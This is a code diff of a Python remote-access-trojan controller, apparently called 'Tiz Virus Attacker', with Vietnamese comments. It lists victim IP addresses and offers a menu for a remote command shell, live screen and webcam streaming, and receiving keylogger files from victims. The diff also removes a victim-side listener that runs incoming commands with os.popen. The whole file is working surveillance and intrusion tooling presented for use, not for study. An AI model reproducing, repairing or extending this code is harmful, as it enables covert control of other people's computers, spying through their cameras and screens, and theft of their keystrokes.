@@ -8,17 +8,17 @@ Created on Dec 23 2020
 from __future__ import division
 import numpy as np
 import socket, argparse, sys, threading, os
+import subprocess
 
 # Danh sách các địa chỉ IP của victim
-VICTIM_IPS = ['192.168.1.2','192.168.1.5', '10.0.2.15', '10.10.26.55']
+VICTIM_IPS = ['192.168.1.68','192.168.1.5', '10.0.2.15', '10.10.26.55']
 
-#arguments parser
+
 def parseargs():
     cli_args = argparse.ArgumentParser(description="Tiz Virus Attacker")
     cli_args.add_argument('--port', help="default port is 5000, revershell = port, camera stream = port+1, screen stream = port+2", default=5000, type=int)
     options = cli_args.parse_args(sys.argv[1:])
-    
-    # Dùng mảng VICTIM_IPS đã định nghĩa
+  
     options.hosts = VICTIM_IPS
     return options
 
@@ -29,7 +29,7 @@ def check_victim_status(hosts, port):
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(1)  # Set timeout to 1 second
             s.connect((host, port))
-            victims_status[host] = "Connected"
+            victims_status[host] = "Reachable"
             s.close()
         except socket.error:
             victims_status[host] = "Not reachable"
@@ -44,7 +44,8 @@ def choose_victim(victims_status):
         choice = input(f"Choose victim to connect (1-{len(victims_status)}): ")
         if choice.isdigit() and 1 <= int(choice) <= len(victims_status):
             selected_host = list(victims_status.keys())[int(choice) - 1]
-            if victims_status[selected_host] == "Connected":
+            # Kiểm tra trạng thái là "Reachable"
+            if victims_status[selected_host] == "Reachable":
                 return selected_host
             else:
                 print(f"Victim {selected_host} is not reachable.")
@@ -65,22 +66,13 @@ def display_action_menu():
             return int(choice)
         else:
             print("Invalid choice, try again.")
-def is_port_open(host, port, timeout=5):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(timeout)
-    try:
-        s.connect((host, port))
-        s.close()
-        return True
-    except:
-        return False
-#reverse shell receiver
 
-def R_tcp(host, port=5000):
+# Reverse shell receiver
+def R_tcp(selected_host, port=5000):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     BUFFER_SIZE = 4096
-    s.connect((host, port))
-    print(f"Connected to victim at {host}:{port}")
+    s.connect((selected_host, port))
+    print(f"Connected to victim at {selected_host}:{port}")
     
     while True:
         command = input("Enter the command you want to execute (or type 'exit' to disconnect): ")
@@ -99,9 +91,7 @@ def R_tcp(host, port=5000):
     
     s.close()
 
-
-
-#Screen receiver
+# Screen receiver
 def recvall(conn, length):
     buf = b''
     while len(buf) < length:
@@ -135,7 +125,7 @@ def screenreceiver(host, port):
             pygame.display.flip()
             clock.tick(60)
 
-#camera receiver
+# Camera receiver
 def dump_buffer(s):
     """ Emptying buffer frame """
     while True:
@@ -182,57 +172,34 @@ def receive_file(host, port, save_directory='received_files'):
         s.listen()
         print(f"Listening for files on {host}:{port}")
         conn, addr = s.accept()
-        with conn:
-            print(f"Connected by {addr}")
-            while True:
-                try:
-                    file_info = conn.recv(1024).strip().decode('utf-8')
-                    if not file_info:
-                        print("No more file info received.")
-                        break
-
-                    filename, filesize = file_info.split('|')
-                    filesize = int(filesize)
-                    print(f"Receiving {filename} with size {filesize} bytes")
-
-                    filepath = os.path.join(save_directory, filename)
-                    with open(filepath, 'wb') as f:
-                        remaining = filesize
-                        while remaining > 0:
-                            chunk_size = 4096 if remaining >= 4096 else remaining
-                            chunk = conn.recv(chunk_size)
-                            if not chunk:
-                                break
-                            f.write(chunk)
-                            remaining -= len(chunk)
-                        print(f"Received {filename} successfully! Saved to {filepath}")
-                except Exception as e:
-                    print(f"Error receiving file: {e}")
+        print(f"Connected by {addr}")
+        while True:
+            try:
+                file_info = conn.recv(1024).strip().decode('utf-8')
+                if not file_info:
+                    print("No more file info received.")
                     break
 
+                filename, filesize = file_info.split('|')
+                filesize = int(filesize)
+                print(f"Receiving {filename} with size {filesize} bytes")
 
-def start_victim_reverse_shell(port):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind(("0.0.0.0", port))
-    s.listen(1)
-    print(f"Victim listening on port {port}...")
+                filepath = os.path.join(save_directory, filename)
+                with open(filepath, 'wb') as f:
+                    remaining = filesize
+                    while remaining > 0:
+                        chunk_size = 4096 if remaining >= 4096 else remaining
+                        chunk = conn.recv(chunk_size)
+                        if not chunk:
+                            print("Connection closed by peer.")
+                            break
+                        f.write(chunk)
+                        remaining -= len(chunk)
+                    print(f"Received {filename} successfully! Saved to {filepath}")
+            except Exception as e:
+                print(f"Error receiving file: {e}")
+                break
 
-    conn, addr = s.accept()
-    print(f"Connection from {addr} established.")
-
-    while True:
-        command = conn.recv(1024).decode()
-        if command.lower() == "exit":
-            break
-        try:
-            # Thực hiện lệnh và trả về kết quả
-            result = os.popen(command).read()
-            conn.send(result.encode())
-        except Exception as e:
-            conn.send(f"Error: {str(e)}".encode())
-    
-    conn.close()
-    s.close()
 if __name__ == '__main__':
     options = parseargs()
     
@@ -243,16 +210,15 @@ if __name__ == '__main__':
         action = display_action_menu()
 
         if action == 1:  # Reverse Shell
-           R_tcp(selected_host, options.port)
-
+            R_tcp(selected_host, options.port)
 
         elif action == 2:  # Stream Screen
-            threadscreen = threading.Thread(target=screenreceiver, args=(selected_host, options.port+1))
+            threadscreen = threading.Thread(target=screenreceiver, args=(selected_host, options.port + 1))
             threadscreen.start()
 
         elif action == 3:  # Stream Camera
-            MAX_DGRAM = 2**16
-            threadcam = threading.Thread(target=camreceiver, args=(selected_host, options.port+2))
+            MAX_DGRAM = 2 ** 16
+            threadcam = threading.Thread(target=camreceiver, args=(selected_host, options.port + 2))
             threadcam.start()
 
         elif action == 4:  # Receive File (Keylogger)
@@ -262,4 +228,4 @@ if __name__ == '__main__':
 
         elif action == 5:  # Exit
             print("Exiting program.")
-            choose_victim(victims_status)
+            break
